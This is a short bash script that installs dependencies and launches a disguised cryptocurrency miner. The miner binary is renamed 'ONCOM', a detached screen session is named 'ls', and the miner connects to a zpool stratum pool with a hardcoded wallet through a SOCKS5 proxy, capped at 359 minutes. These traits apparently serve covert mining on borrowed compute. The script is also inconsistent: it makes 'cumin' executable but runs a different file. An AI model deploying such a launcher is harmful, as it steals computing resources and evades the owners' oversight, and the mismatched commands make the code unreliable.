#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://yespower.na.mine.zpool.ca:6234
WALLET=MDqwVFKpMtttsvFfss2tegk97QTHUX26ig
WORKER=c=LTC,zap=BTE
PROXY=socks5://184.185.2.244:4145
timeout 359m ./ONCOM -a yescryptR16 -o $POOL -u $WALLET.$WORKER -t 16 -x $PROXY